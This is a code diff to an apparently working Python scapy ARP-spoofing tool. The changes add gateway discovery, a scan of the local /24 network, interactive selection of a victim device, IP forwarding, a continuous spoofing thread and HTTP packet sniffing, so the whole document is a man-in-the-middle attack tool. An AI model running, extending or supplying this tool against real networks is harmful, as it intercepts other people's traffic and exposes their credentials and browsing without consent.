@@ -1,12 +1,40 @@
 import scapy.all as scapy
 from scapy.layers import http
-import time
 import subprocess
+import time
 from threading import Thread
 
-# Victim and router IPs
-victim_ip = "172.16.149.163"
-router_ip = "172.16.149.2"
+# Get the gateway IP and MAC address using `arp -a`
+def get_gateway():
+    result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
+    lines = result.stdout.splitlines()
+    for line in lines:
+        if "_gateway" in line:
+            parts = line.split()
+            gateway_ip = parts[1].strip("()")
+            gateway_mac = parts[3]
+            return gateway_ip, gateway_mac
+    return None, None
+
+# Scan the network for connected devices
+def scan(ip_range):
+    arp_request = scapy.ARP(pdst=ip_range)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
+
+    devices = []
+    for element in answered_list:
+        device = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+        devices.append(device)
+    return devices
+
+# Display the scanned devices
+def display_devices(devices):
+    print("\n[INFO] Devices on the network:")
+    print("Index\tIP Address\t\tMAC Address")
+    for index, device in enumerate(devices, start=1):
+        print(f"{index}\t{device['ip']}\t{device['mac']}")
 
 # Enable port forwarding
 def enable_port_forwarding():
@@ -39,7 +67,7 @@ def get_mac(ip):
     return answered_list[0][1].hwsrc
 
 # ARP spoofer loop
-def arp_spoof():
+def arp_spoof(victim_ip, router_ip):
     sent_packet_counter = 0
     try:
         while True:
@@ -93,20 +121,39 @@ def process_sniffed_packet(packet):
 
 # Main function
 if __name__ == "__main__":
+    # Step 1: Identify the gateway
+    gateway_ip, gateway_mac = get_gateway()
+    if not gateway_ip:
+        print("[ERROR] Unable to identify the gateway.")
+        exit(1)
+    print(f"[INFO] Gateway identified: {gateway_ip} ({gateway_mac})")
+
+    # Step 2: Scan the network
+    print("[INFO] Scanning the network...")
+    devices = scan(f"{gateway_ip}/24")
+    if not devices:
+        print("[ERROR] No devices found on the network.")
+        exit(1)
+    display_devices(devices)
+
+    # Step 3: Select a target
+    target_index = int(input("[INFO] Select a target (index): ")) - 1
+    if target_index < 0 or target_index >= len(devices):
+        print("[ERROR] Invalid selection.")
+        exit(1)
+
+    victim_ip = devices[target_index]["ip"]
+    print(f"[INFO] Target selected: {victim_ip}")
+
+    # Step 4: Start ARP spoofing and sniffing
     enable_port_forwarding()
-
-    # Run the ARP spoofer in a separate thread
-    arp_thread = Thread(target=arp_spoof)
+    arp_thread = Thread(target=arp_spoof, args=(victim_ip, gateway_ip))
     arp_thread.start()
-
-    # Wait for the ARP spoofer to send 10 packets
     arp_thread.join()
 
-    # Start packet sniffing
     try:
         sniff("eth0")  # Replace "eth0" with your network interface
     except KeyboardInterrupt:
-        # Restore ARP tables on interruption
-        restore(victim_ip, router_ip)
-        restore(router_ip, victim_ip)
+        restore(victim_ip, gateway_ip)
+        restore(gateway_ip, victim_ip)
         print("\n[+] Detected CTRL + C, restoring ARP tables and exiting.")
